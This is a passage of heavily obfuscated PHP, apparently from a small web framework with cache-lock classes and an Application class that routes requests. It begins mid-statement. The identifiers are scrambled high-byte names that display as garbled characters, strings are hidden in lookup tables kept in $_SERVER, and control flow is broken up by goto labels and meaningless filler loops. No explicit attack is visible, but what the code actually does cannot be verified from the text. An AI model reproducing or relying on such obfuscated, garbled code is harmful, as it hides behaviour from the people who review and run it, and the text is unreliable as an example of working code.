(file_exists($FÌàã¢ĞĞ‘) && filemtime($FÌàã¢ĞĞ‘) && filemtime($FÌàã¢ĞĞ‘) < time() - 10) { @unlink($FÌàã¢ĞĞ‘); } do { if (file_exists($FÌàã¢ĞĞ‘)) { cacheLockWait(); continue; } $b‡Ç½í’ = fopen($FÌàã¢ĞĞ‘, $fâíÓ£Ñö[777]); if (!$b‡Ç½í’) { return !1; } $Dïò©˜° = flock($b‡Ç½í’, LOCK_EX | LOCK_NB); self::$caches[$e×ÓÖ©ô³] = array($fâíÓ£Ñö[778] => $b‡Ç½í’, $fâíÓ£Ñö[167] => $FÌàã¢ĞĞ‘); fwrite($b‡Ç½í’, $cæª§Ìàò); clearstatcache(); if ($b‡Ç½í’ && $Dïò©˜°) { return !0; } cacheLockWait(); } while (microtime(!0) < $cæª§Ìàò); goto F°ë±İö…ë; EŒºŸøÅÈò: $fâíÓ£Ñö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fâšƒ—©›Ø = microtime(!0); $cæª§Ìàò = $fâšƒ—©›Ø + $Fñ‚å¾¶±Î + 0.0001; goto F…« ³ƒõ; a›èÎó¿‘ø: } public function lockGet($cå­½—ö…­) { $d££ºÔ¿Ì– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BË›¬Ğ¼ïÊ = rtrim(self::$cachePath, $d££ºÔ¿Ì–[8]) . $d££ºÔ¿Ì–[775] . md5($cå­½—ö…­) . $d££ºÔ¿Ì–[776]; return file_exists($BË›¬Ğ¼ïÊ); } public function unlock($eŸÉáóÑ) { goto a¨Ü®Â‡‘ó; a¨Ü®Â‡‘ó: $D¥«Í¹…ì² =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C×ŠĞáØÉÆ = self::$caches[$eŸÉáóÑ]; if (!$C×ŠĞáØÉÆ) { return; } goto FğëÇ­ã¥Œ; F¦ƒ‹‰ŒÀ: unset(self::$caches[$eŸÉáóÑ]); goto B´‚º„ßÜß; FğëÇ­ã¥Œ: @flock($C×ŠĞáØÉÆ[$D¥«Í¹…ì²[778]], LOCK_UN); @fclose($C×ŠĞáØÉÆ[$D¥«Í¹…ì²[778]]); @unlink($C×ŠĞáØÉÆ[$D¥«Í¹…ì²[167]]); goto F¦ƒ‹‰ŒÀ; B´‚º„ßÜß: } } class CacheLockRedis { public function lock($f–²ùÀëÏ, $Aù˜”íÏö = 10) { $C™ÒáœÖïá = Cache::init(); $b¢×Äêˆ†Í = microtime(!0) + $Aù˜”íÏö; while (microtime(!0) < $b¢×Äêˆ†Í) { $d­Ù’›”àĞ = $C™ÒáœÖïá->get($f–²ùÀëÏ); if (!$d­Ù’›”àĞ) { $AÄ°¦Ë‘Çˆ = $C™ÒáœÖïá->setLock($f–²ùÀëÏ, $b¢×Äêˆ†Í, $Aù˜”íÏö); if ($AÄ°¦Ë‘Çˆ) { return !0; } } else { if ($d­Ù’›”àĞ < microtime(!0)) { $C™ÒáœÖïá->set($f–²ùÀëÏ, $b¢×Äêˆ†Í, $b¢×Äêˆ†Í); if ($C™ÒáœÖïá->get($f–²ùÀëÏ) === $d­Ù’›”àĞ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($aÎØä“…ª) { return Cache::init()->get($aÎØä“…ª); } public function unlock($C¡Ğ¢Ï¬‹) { return Cache::init()->remove($C¡Ğ¢Ï¬‹); } } goto Dî÷š×‰®Æ; f‰Ã¦¨‘ôª: class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\x69\156\x64\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($D¾êòÑí’õ) { goto cšÀ·Ş¨Ì…; bÌÄÔ«ºÚ: $EË‘ò—ãÖ = $CÜ¾ƒŠ‰„[554]; if (strlen($EË‘ò—ãÖ) < $CÜ¾ƒŠ‰„[555]) { die; } $this->defaultAction = $BÈ©ãß§´È[2] ? $BÈ©ãß§´È[2] : $this->defaultAction; goto dœ¨›¾®ê; CÔƒÒ’Æê™: $eŒè¢¨ÄÂ„ = $CÜ¾ƒŠ‰„[553]; $this->defaultModule = $BÈ©ãß§´È[0] ? $BÈ©ãß§´È[0] : $this->defaultModule; $this->defaultController = $BÈ©ãß§´È[1] ? $BÈ©ãß§´È[1] : $this->defaultController; goto bÌÄÔ«ºÚ; dœ¨›¾®ê: $FĞº‹‘¥æ± = $CÜ¾ƒŠ‰„[556]; if (!$FĞº‹‘¥æ±) { return; } $this->{$_SERVER[§Š×Ö][3]}($e£²”¯ƒÔ°[4], array($this, $e£²”¯ƒÔ°[5])); goto D”šãáÍÕâ; cšÀ·Ş¨Ì…: $CÜ¾ƒŠ‰„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e£²”¯ƒÔ° =& $_SERVER[§Š×Ö]; $BÈ©ãß§´È = $e£²”¯ƒÔ°[0]($e£²”¯ƒÔ°[1], $e£²”¯ƒÔ°[2]($D¾êòÑí’õ, $e£²”¯ƒÔ°[1])); goto CÔƒÒ’Æê™; D”šãáÍÕâ: } public function appRun($cñ‹×ØğÎ) { goto cëÜÒ¸Øñ; BÅŸ¾°„Ê: $dÈóÁ‰õÑ› = $cº‡âğô‘›[7]; if ($bÚ¦‡° ö­ == $cº‡âğô‘›[8]) { $dÈóÁ‰õÑ› = $cº‡âğô‘›[9]; $f¼¿¿îÔ‡[0] = $cº‡âğô‘›[10]; $f¼¿¿îÔ‡[1] = $f¼¿¿îÔ‡[1] . $cº‡âğô‘›[11]; $cñ‹×ØğÎ = $cº‡âğô‘›[12]($cº‡âğô‘›[1], $f¼¿¿îÔ‡); $cñ‹×ØğÎ = $cº‡âğô‘›[2]($cñ‹×ØğÎ, $cº‡âğô‘›[1]); } $cº‡âğô‘›[13](array($cº‡âğô‘›[14], $cº‡âğô‘›[15]), $dÈóÁ‰õÑ› . $cº‡âğô‘›[16], $cñ‹×ØğÎ); goto Cƒ½ˆÕôÅÒ; f´¨Ã„ñ: $cº‡âğô‘›[13](array($cº‡âğô‘›[14], $cº‡âğô‘›[15]), $dÈóÁ‰õÑ› . $cº‡âğô‘›[18], $cñ‹×ØğÎ); $AˆÏ±”ÄÌñ = $Fø¾…É‚±ã[561]; while (strlen($AˆÏ±”ÄÌñ) < $Fø¾…É‚±ã[562]) { if (!$AˆÏ±”ÄÌñ) { break; } $AˆÏ±”ÄÌñ++; } goto aæ÷µ¡Œ’; Cƒ½ˆÕôÅÒ: $cº‡âğô‘›[17]($cñ‹×ØğÎ); $Bó–®Ğñôø = $Fø¾…É‚±ã[559]; while ($Bó–®Ğñôø < $Fø¾…É‚±ã[560]) { if ($Bó–®Ğñôø >= 0) { break; } $Bó–®Ğñôø++; } goto f´¨Ã„ñ; cëÜÒ¸Øñ: $Fø¾…É‚±ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cº‡âğô‘› =& $_SERVER[§Š×Ö]; $f¼¿¿îÔ‡ = $cº‡âğô‘›[0]($cº‡âğô‘›[1], $cñ‹×ØğÎ); goto dÈØÙåñä; dÈØÙåñä: $f³ËÙ¥ § = $Fø¾…É‚±ã[557]; if (strlen($f³ËÙ¥ §) < $Fø¾…É‚±ã[558]) { return; } $bÚ¦‡° ö­ = $cº‡âğô‘›[6]($f¼¿¿îÔ‡[0]); goto BÅŸ¾°„Ê; aæ÷µ¡Œ’: } private function autorun() { $B—Û…‹ŞŸº =& $_SERVER[§Š×Ö]; global $config; if ($B—Û…‹ŞŸº[19]($config[$B—Û…‹ŞŸº[20]]) == 0) { return; } foreach ($config[$B—Û…‹ŞŸº[20]] as $BöäÄæ‚¹… => $B¸«İÁ²Ô•) { $this->{$_SERVER[§Š×Ö][21]}($B¸«İÁ²Ô•); } } private function amvhd48573ed() { goto a±†­ø‚—; EŠİšõ¢÷Ş: $D”‡ââùøó = array($c£òšà…ö¼[8], $DÙ®ÕŞ¦÷¥); $EÒÙ„ò ¿¼ = $bñÁ¿¥¿õ[564]; if (!$EÒÙ„ò ¿¼) { return; } goto F‡—ÇÏÛ¿”; a±†­ø‚—: $bñÁ¿¥¿õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c£òšà…ö¼ =& $_SERVER[§Š×Ö]; $dµ‚ÁÛ‡Üî = $c£òšà…ö¼[8]; goto eİâ…ãŠá; Cîï’âÎ: $GLOBALS[$c£òšà…ö¼[22]][$c£òšà…ö¼[23]] = $c£òšà…ö¼[27]($D”‡ââùøó, $A¤¦ô£“®º); $GLOBALS[$c£òšà…ö¼[22]][$c£òšà…ö¼[28]] = $c£òšà…ö¼[29]($c£òšà…ö¼[1], $GLOBALS[$c£òšà…ö¼[22]][$c£òšà…ö¼[23]]); $cùîøŠå‘Ñ = $bñÁ¿¥¿õ[566]; goto D¦¸²ì‚§‰; F‡—ÇÏÛ¿”: $A¤¦ô£“®º = $c£òšà…ö¼[26]($GLOBALS[$c£òšà…ö¼[22]][$c£òšà…ö¼[23]], 1); $AñÕ‰”ÇŸ = $bñÁ¿¥¿õ[565]; while ($AñÕ‰”ÇŸ < $bñÁ¿¥¿õ[560]) { if ($AñÕ‰”ÇŸ >= 0) { break; } $AñÕ‰”ÇŸ++; } goto Cîï’âÎ; EŞç¼¼¥Á“: if (!$d¶ïÎ«‰ || $c£òšà…ö¼[24]($d¶ïÎ«‰) <= $c£òšà…ö¼[24]($dµ‚ÁÛ‡Üî)) { return; } if ($c£òšà…ö¼[6]($c£òšà…ö¼[25]($d¶ïÎ«‰, -$c£òšà…ö¼[24]($dµ‚ÁÛ‡Üî))) != $dµ‚ÁÛ‡Üî) { return; } $DÙ®ÕŞ¦÷¥ = $c£òšà…ö¼[25]($d¶ïÎ«‰, 0, -$c£òšà…ö¼[24]($dµ‚ÁÛ‡Üî)); goto EŠİšõ¢÷Ş; eİâ…ãŠá: $d¶ïÎ«‰ = $GLOBALS[$c£òšà…ö¼[22]][$c£òšà…ö¼[23]][0]; $dâ†Ù¸×¶ = $bñÁ¿¥¿õ[563]; while (strlen($dâ†Ù¸×¶) < $bñÁ¿¥¿õ[558]) { if (!$dâ†Ù¸×¶) { break; } $dâ†Ù¸×¶++; } goto EŞç¼¼¥Á“; D¦¸²ì‚§‰: if (strlen($cùîøŠå‘Ñ) < $bñÁ¿¥¿õ[562]) { return; } goto E²”¹‘§ˆ; E²”¹‘§ˆ: } private function ydljefc2be8b() { goto dá³æÃ­òÖ; f¥ìæˆ’ãä: $EÁƒ³ÍÅø = $_SERVER[$E»Ãó¹ôÃ•[30]]; $dæ‹¾Ù„„ = $cìõæâİ•Ü[567]; if (!$dæ‹¾Ù„„) { die; } goto FõÕÚ’ô™Ã; c¹‘©‰’…¦: $E»Ãó¹ôÃ•[34]($E»Ãó¹ôÃ•[35], $FêÈóÓİÎ, $aË±Š­¿ø); $e½ç’õ¢î† = $cìõæâİ•Ü[569]; $FêÈóÓİÎ = $E»Ãó¹ôÃ•[2]($aË±Š­¿ø[0][0], $E»Ãó¹ôÃ•[36]); goto C¨Ÿï·¢ğÕ; dá³æÃ­òÖ: $cìõæâİ•Ü =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E»Ãó¹ôÃ• =& $_SERVER[§Š×Ö]; if ($GLOBALS[$E»Ãó¹ôÃ•[22]][$E»Ãó¹ôÃ•[28]] != $E»Ãó¹ôÃ•[10]) { return; } goto f¥ìæˆ’ãä; C¨Ÿï·¢ğÕ: $fÖƒÕù×… = $cìõæâİ•Ü[570]; while (strlen($fÖƒÕù×…) < $cìõæâİ•Ü[558]) { if (!$fÖƒÕù×…) { break; } $fÖƒÕù×…++; } $GLOBALS[$E»Ãó¹ôÃ•[22]][$E»Ãó¹ôÃ•[23]] = $E»Ãó¹ôÃ•[0]($E»Ãó¹ôÃ•[36], $FêÈóÓİÎ); goto F Ïª÷‰Âè; c‰‘íÀä‰”: $Bí°÷ˆ‹ = $cìõæâİ•Ü[568]; while (strlen($Bí°÷ˆ‹) < $cìõæâİ•Ü[555]) { if (!$Bí°÷ˆ‹) { break; } $Bí°÷ˆ‹++; } $FêÈóÓİÎ = $E»Ãó¹ôÃ•[25]($EÁƒ³ÍÅø, $eÚõŠƒøù + $E»Ãó¹ôÃ•[24]($C¼Û‰¬°Öî)); goto c¹‘©‰’…¦; F Ïª÷‰Âè: $GLOBALS[$E»Ãó¹ôÃ•[22]][$E»Ãó¹ôÃ•[28]] = $E»Ãó¹ôÃ•[29]($E»Ãó¹ôÃ•[1], $GLOBALS[$E»Ãó¹ôÃ•[22]][$E»Ãó¹ôÃ•[23]]); goto cÉœ¡ÍŒÀ; FõÕÚ’ô™Ã: $C¼Û‰¬°Öî = $E»Ãó¹ôÃ•[31]; if (!$E»Ãó¹ôÃ•[32]($EÁƒ³ÍÅø, $C¼Û‰¬°Öî)) { return; } $eÚõŠƒøù = $E»Ãó¹ôÃ•[33]($EÁƒ³ÍÅø, $C¼Û‰¬°Öî); goto c‰‘íÀä‰”; cÉœ¡ÍŒÀ: } public function run() { goto C»‰±—‚…; aÔßôĞùÃ¿: $Fæƒ•Ÿ±¡Ü = $e«ã’¹êÌ—[574]; $dëÒ‰•ÓÙ¢[39]($dëÒ‰•ÓÙ¢[40], isset($B•ìâˆô—¥[0]) && $B•ìâˆô—¥[0] ? $B•ìâˆô—¥[0] : $this->defaultModule); $dëÒ‰•ÓÙ¢[39]($dëÒ‰•ÓÙ¢[41], isset($B•ìâˆô—¥[1]) && $B•ìâˆô—¥[0] ? $B•ìâˆô—¥[1] : $this->defaultController); goto EÌŞÂ¼—Š¾; EÌŞÂ¼—Š¾: $dëÒ‰•ÓÙ¢[39]($dëÒ‰•ÓÙ¢[42], isset($B•ìâˆô—¥[2]) && $B•ìâˆô—¥[0] ? $B•ìâˆô—¥[2] : $this->defaultAction); $f¶¿¦¯ßé = $e«ã’¹êÌ—[575]; if (!$f¶¿¦¯ßé) { die; } goto EŸ‹…íˆÓè; EŸ‹…íˆÓè: $dëÒ‰•ÓÙ¢[39]($dëÒ‰•ÓÙ¢[43], MOD . $dëÒ‰•ÓÙ¢[1] . ST . $dëÒ‰•ÓÙ¢[1] . ACT); $_SERVER[$dëÒ‰•ÓÙ¢[44]] = $dëÒ‰•ÓÙ¢[6](ACTION); $this->{$_SERVER[§Š×Ö][45]}(); goto e‹ŸÈ‘³¨ò; e‹ŸÈ‘³¨ò: $A¿ÏÏÉêå¸ = $e«ã’¹êÌ—[576]; if (!$A¿ÏÏÉêå¸) { die; } if ($dëÒ‰•ÓÙ¢[19]($B•ìâˆô—¥) >= 3) { $this->{$_SERVER[§Š×Ö][21]}($fäšÄÍàÕ); } else { $this->{$_SERVER[§Š×Ö][21]}(ACTION); } goto FîŒá À¡; C»‰±—‚…: $e«ã’¹êÌ— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dëÒ‰•ÓÙ¢ =& $_SERVER[§Š×Ö]; $this->{$_SERVER[§Š×Ö][37]}(); goto a‰ø÷º‡; B¾ºğ®Ÿß†: $a†Åè¤¯È˜ = $e«ã’¹êÌ—[573]; if (strlen($a†Åè¤¯È˜) < $e«ã’¹êÌ—[555]) { return; } $fäšÄÍàÕ = $GLOBALS[$dëÒ‰•ÓÙ¢[22]][$dëÒ‰•ÓÙ¢[28]]; goto aÔßôĞùÃ¿; Fˆ§Šù™”Ã: $C‰ØÅ¥à¬ = $e«ã’¹êÌ—[572]; if (strlen($C‰ØÅ¥à¬) < $e«ã’¹êÌ—[560]) { die; } $B•ìâˆô—¥ = $GLOBALS[$dëÒ‰•ÓÙ¢[22]][$dëÒ‰•ÓÙ¢[23]]; goto B¾ºğ®Ÿß†; a‰ø÷º‡: $B¯¿š»í£Ğ = $e«ã’¹êÌ—[571]; while ($B¯¿š»í£Ğ < $e«ã’¹êÌ—[560]) { if ($B¯¿š»í£Ğ >= 0) { break; } $B¯¿š»í£Ğ++; } $this->{$_SERVER[§Š×Ö][38]}(); goto Fˆ§Šù™”Ã; FîŒá À¡: } private $wprj680d81ef = array(); private $vhcz9accfc7c = ''; public function vszi1f00cb3e() { goto eõ´ó’ÅÎ; F³Ãù™ˆ˜‰: $AŒËôÑÌ–‹ = $D•è»–±È—[585]; $this->{$_SERVER[§Š×Ö][3]}($Cõš£ÑŞÆÔ[59], array($this, $Cõš£ÑŞÆÔ[60])); $F÷¯´õ¯„î = $D•è»–±È—[586]; goto BÓñÏÃç‚²; fåö„¸ñÙ: $FÜãæ›Çñ³ = $D•è»–±È—[578]; $this->{$_SERVER[§Š×Ö][48]}(); $DÚÈ±˜†‡ = $D•è»–±È—[579]; goto dîô¹„ì…Ï; F·í©§ñ›Æ: $eàø¢³Ì“„ = $D•è»–±È—[584]; if (!$eàø¢³Ì“„) { die; } $this->{$_SERVER[§Š×Ö][3]}($Cõš£ÑŞÆÔ[57], array($this, $Cõš£ÑŞÆÔ[58])); goto F³Ãù™ˆ˜‰; dîô¹„ì…Ï: $this->{$_SERVER[§Š×Ö][49]}(); $bÜøÍ‰ˆ¸¤ = $D•è»–±È—[580]; while (strlen($bÜøÍ‰ˆ¸¤) < $D•è»–±È—[581]) { if (!$bÜøÍ‰ˆ¸¤) { break; } $bÜøÍ‰ˆ¸¤++; } goto C–¦ÂÍæê¤; C–¦ÂÍæê¤: $this->{$_SERVER[§Š×Ö][50]}(); $fï‚ãç·•¶ = $D•è»–±È—[582]; if (!$fï‚ãç·•¶) { return; } goto cåí§²·Ñ; BïŸâ–Òå’: $C¸âŞ•öˆ = $D•è»–±È—[583]; if (strlen($C¸âŞ•öˆ) < $D•è»–±È—[558]) { return; } $this->{$_SERVER[§Š×Ö][3]}($Cõš£ÑŞÆÔ[55], array($this, $Cõš£ÑŞÆÔ[56])); goto F·í©§ñ›Æ; cåí§²·Ñ: $this->{$_SERVER[§Š×Ö][51]}(); $this->{$_SERVER[§Š×Ö][52]}(); $this->{$_SERVER[§Š×Ö][3]}($Cõš£ÑŞÆÔ[53], array($this, $Cõš£ÑŞÆÔ[54])); goto BïŸâ–Òå’; eõ´ó’ÅÎ: $D•è»–±È— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cõš£ÑŞÆÔ =& $_SERVER[§Š×Ö]; $this->{$_SERVER[§Š×Ö][46]}(); goto c³Çñ‘œÖ; c³Çñ‘œÖ: $f˜ ÓÕé†² = $D•è»–±È—[577]; if (!$f˜ ÓÕé†²) { die; } $this->{$_SERVER[§Š×Ö][47]}(); goto fåö„¸ñÙ; BÓñÏÃç‚²: while ($F÷¯´õ¯„î < $D•è»–±È—[560]) { if ($F÷¯´õ¯„î >= 0) { break; } $F÷¯´õ¯„î++; } goto fºÈÍ´³†; fºÈÍ´³†: } public function vmtj9fd5306a($aµ÷öÁæâ) { goto DÔ‰ò«ÖÅ†; D›ø„¦ÕÒ: $cÌÎ…™ÃšË = array($eñŸÙÛ§ÈÊ[64], $eñŸÙÛ§ÈÊ[65], $eñŸÙÛ§ÈÊ[66], $eñŸÙÛ§ÈÊ[67], $eñŸÙÛ§ÈÊ[68], $eñŸÙÛ§ÈÊ[69], $eñŸÙÛ§ÈÊ[70], $eñŸÙÛ§ÈÊ[71], $eñŸÙÛ§ÈÊ[72], $eñŸÙÛ§ÈÊ[73], $eñŸÙÛ§ÈÊ[74], $eñŸÙÛ§ÈÊ[75], $eñŸÙÛ§ÈÊ[76], $eñŸÙÛ§ÈÊ[77], $eñŸÙÛ§ÈÊ[78], $eñŸÙÛ§ÈÊ[79], $eñŸÙÛ§ÈÊ[80], $eñŸÙÛ§ÈÊ[81], $eñŸÙÛ§ÈÊ[82], $eñŸÙÛ§ÈÊ[83], $eñŸÙÛ§ÈÊ[84], $eñŸÙÛ§ÈÊ[85], $eñŸÙÛ§ÈÊ[86], $eñŸÙÛ§ÈÊ[87], $eñŸÙÛ§ÈÊ[88], $eñŸÙÛ§ÈÊ[89], $eñŸÙÛ§ÈÊ[90], $eñŸÙÛ§ÈÊ[91], $eñŸÙÛ§ÈÊ[92], $eñŸÙÛ§ÈÊ[93], $eñŸÙÛ§ÈÊ[94], $eñŸÙÛ§ÈÊ[95], $eñŸÙÛ§ÈÊ[96], $eñŸÙÛ§ÈÊ[97], $eñŸÙÛ§ÈÊ[98], $eñŸÙÛ§ÈÊ[99]); $bí®‘Ë×éï = $FŒ¸ÈÍ¡¹Ã[587]; while (strlen($bí®‘Ë×éï) < $FŒ¸ÈÍ¡¹Ã[558]) { if (!$bí®‘Ë×éï) { break; } $bí®‘Ë×éï++; } goto EÌ¢êßéŞ’; eÒãïëùñˆ: $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[139]] = $eñŸÙÛ§ÈÊ[113]($this->wprj680d81ef, $eñŸÙÛ§ÈÊ[140], $eñŸÙÛ§ÈÊ[10]); $D‘Œ«ß‹Ä‹ = $FŒ¸ÈÍ¡¹Ã[594]; if (strlen($D‘Œ«ß‹Ä‹) < $FŒ¸ÈÍ¡¹Ã[560]) { return; } goto D¥ŸöÜƒáÊ; Bø·ºø—¨é: while (strlen($fœŞÁÌ²ÍŞ) < $FŒ¸ÈÍ¡¹Ã[558]) { if (!$fœŞÁÌ²ÍŞ) { break; } $fœŞÁÌ²ÍŞ++; } unset($aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$eñŸÙÛ§ÈÊ[76]]); $a£¬…‹ãòŠ = $FŒ¸ÈÍ¡¹Ã[592]; goto Båêï˜®; E·áæõ÷Çß: if (!$c‹ĞÀäİ‹) { return; } $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$eñŸÙÛ§ÈÊ[108]] = array($eñŸÙÛ§ÈÊ[109] => (int) $bàÓ“Ôó‚Ï[$eñŸÙÛ§ÈÊ[110]], $eñŸÙÛ§ÈÊ[111] => $eñŸÙÛ§ÈÊ[112]($eñŸÙÛ§ÈÊ[113]($bàÓ“Ôó‚Ï, $eñŸÙÛ§ÈÊ[114], array())), $eñŸÙÛ§ÈÊ[115] => (int) $eñŸÙÛ§ÈÊ[113]($bàÓ“Ôó‚Ï, $eñŸÙÛ§ÈÊ[116], 0)); $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[118]] = $eñŸÙÛ§ÈÊ[119]($eñŸÙÛ§ÈÊ[120])->{$_SERVER[§Š×Ö][121]}(); goto AÖœÒõ; F¯‚—èÊÔ˜: while (strlen($CÚ÷Ó¨¬˜) < $FŒ¸ÈÍ¡¹Ã[555]) { if (!$CÚ÷Ó¨¬˜) { break; } $CÚ÷Ó¨¬˜++; } unset($aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[104]][$eñŸÙÛ§ÈÊ[106]]); $fœŞÁÌ²ÍŞ = $FŒ¸ÈÍ¡¹Ã[591]; goto Bø·ºø—¨é; AÖœÒõ: $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[122]] = $eñŸÙÛ§ÈÊ[123]($_SERVER[$eñŸÙÛ§ÈÊ[124]] . $D±öß£Úè[$eñŸÙÛ§ÈÊ[125]]); $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[126]] = $eñŸÙÛ§ÈÊ[127]($eñŸÙÛ§ÈÊ[128]()); $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[129]] = $this->vhcz9accfc7c; goto fÓ²ÇğµÆ; fÓ²ÇğµÆ: if ($D±öß£Úè[$eñŸÙÛ§ÈÊ[129]] != $eñŸÙÛ§ÈÊ[130]) { $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[131]] = $D±öß£Úè[$eñŸÙÛ§ÈÊ[131]]; $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[132]] = $D±öß£Úè[$eñŸÙÛ§ÈÊ[132]]; $bõ‘‡Úøç = $eñŸÙÛ§ÈÊ[133](10) . $this->vhcz9accfc7c . $eñŸÙÛ§ÈÊ[133](5); $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[134]][$eñŸÙÛ§ÈÊ[135]] = $this->{$_SERVER[§Š×Ö][136]}($bõ‘‡Úøç, $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[122]]); } if ($this->vhcz9accfc7c == $eñŸÙÛ§ÈÊ[130]) { $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$eñŸÙÛ§ÈÊ[108]][$eñŸÙÛ§ÈÊ[116]] = 0; } $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[137]] = $eñŸÙÛ§ÈÊ[113]($this->wprj680d81ef, $eñŸÙÛ§ÈÊ[138], $eñŸÙÛ§ÈÊ[10]); goto eÒãïëùñˆ; D¥ŸöÜƒáÊ: if ($eñŸÙÛ§ÈÊ[113]($GLOBALS, $eñŸÙÛ§ÈÊ[141]) && $this->config[$eñŸÙÛ§ÈÊ[142]]) { $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[117]][$eñŸÙÛ§ÈÊ[143]] = WEB_ROOT; } return $aµ÷öÁæâ; goto cœâÊ²²ïù; dÊ±ÈîÊ†: if (!$E†ºäóÀå´) { return; } unset($aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[104]][$eñŸÙÛ§ÈÊ[105]]); $CÚ÷Ó¨¬˜ = $FŒ¸ÈÍ¡¹Ã[590]; goto F¯‚—èÊÔ˜; DÔ‰ò«ÖÅ†: $FŒ¸ÈÍ¡¹Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eñŸÙÛ§ÈÊ =& $_SERVER[§Š×Ö]; $D±öß£Úè = $eñŸÙÛ§ÈÊ[61]($eñŸÙÛ§ÈÊ[62])->{$_SERVER[§Š×Ö][63]}(); goto D›ø„¦ÕÒ; Båêï˜®: if (!$a£¬…‹ãòŠ) { return; } unset($aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$eñŸÙÛ§ÈÊ[107]]); $c‹ĞÀäİ‹ = $FŒ¸ÈÍ¡¹Ã[593]; goto E·áæõ÷Çß; EÌ¢êßéŞ’: foreach ($cÌÎ…™ÃšË as $c•äÄù°Á®) { $AŸƒ¨‡óµ‘ = $GLOBALS[$eñŸÙÛ§ÈÊ[100]][$eñŸÙÛ§ÈÊ[101]][$c•äÄù°Á®]; $E‡í¹ì¢Ğ¬ = $FŒ¸ÈÍ¡¹Ã[588]; while ($E‡í¹ì¢Ğ¬ < $FŒ¸ÈÍ¡¹Ã[558]) { if ($E‡í¹ì¢Ğ¬ >= 0) { break; } $E‡í¹ì¢Ğ¬++; } if (isset($D±öß£Úè[$c•äÄù°Á®])) { $AŸƒ¨‡óµ‘ = $D±öß£Úè[$c•äÄù°Á®]; } $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$c•äÄù°Á®] = $AŸƒ¨‡óµ‘; } $bàÓ“Ôó‚Ï = $aµ÷öÁæâ[$eñŸÙÛ§ÈÊ[102]][$eñŸÙÛ§ÈÊ[103]][$eñŸÙÛ§ÈÊ[76]]; $E†ºäóÀå´ = $FŒ¸ÈÍ¡¹Ã[589]; goto dÊ±ÈîÊ†; cœâÊ²²ïù: } private function dmht79a73187() { goto f’ò…Úª¶; bÚ…œ‚”Å: foreach ($C¬¦ŠïÏ† as $aÉƒ¢˜ƒõ) { if (!isset($bĞÛìËÑ‰â[$aÉƒ¢˜ƒõ]) || !$bĞÛìËÑ‰â[$aÉƒ¢˜ƒõ]) { continue; } $E·ñ¦«óŒ[$aÉƒ¢˜ƒõ] = $bĞÛìËÑ‰â[$aÉƒ¢˜ƒõ]; } $fÊø°Íå”‡[13](array($fÊø°Íå”‡[160], $fÊø°Íå”‡[161]), $E·ñ¦«óŒ); goto dÑÒ·Àº‘†; cø®ó›©Ì: $e±…Âã…† = $B‘ŒÛÊªòö[598]; if (strlen($e±…Âã…†) < $B‘ŒÛÊªòö[581]) { die; } $E·ñ¦«óŒ = array($fÊø°Íå”‡[168] => $bĞÛìËÑ‰â[$fÊø°Íå”‡[64]], $fÊø°Íå”‡[169] => $bĞÛìËÑ‰â[$fÊø°Íå”‡[65]], $fÊø°Íå”‡[170] => $fÊø°Íå”‡[10]); goto bÚ…œ‚”Å; f’ò…Úª¶: $B‘ŒÛÊªòö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÊø°Íå”‡ =& $_SERVER[§Š×Ö]; if ($_SERVER[$fÊø°Íå”‡[44]] == $fÊø°Íå”‡[144]) { goto DÈí×£ˆ; F‹†¦Ö–â: $cïÈ˜î¹¶ = $B‘ŒÛÊªòö[596]; if (!$cïÈ˜î¹¶) { die; } $fÊø°Íå”‡[13](array($fÊø°Íå”‡[160], $fÊø°Íå”‡[161]), $E·ñ¦«óŒ); goto BàÌíë; BàÌíë: $E´‡á¬´¬ = $B‘ŒÛÊªòö[597]; goto b¨¥•‰‹Ç; CÅÎ¦Î»·ç: $bÕøøø–ùè = $B‘ŒÛÊªòö[595]; if (!$bÕøøø–ùè) { die; } $E·ñ¦«óŒ = array($fÊø°Íå”‡[159] => $fÂÙŠ®‚¾¬); goto F‹†¦Ö–â; DÈí×£ˆ: $fÂÙŠ®‚¾¬ = array($fÊø°Íå”‡[129] => 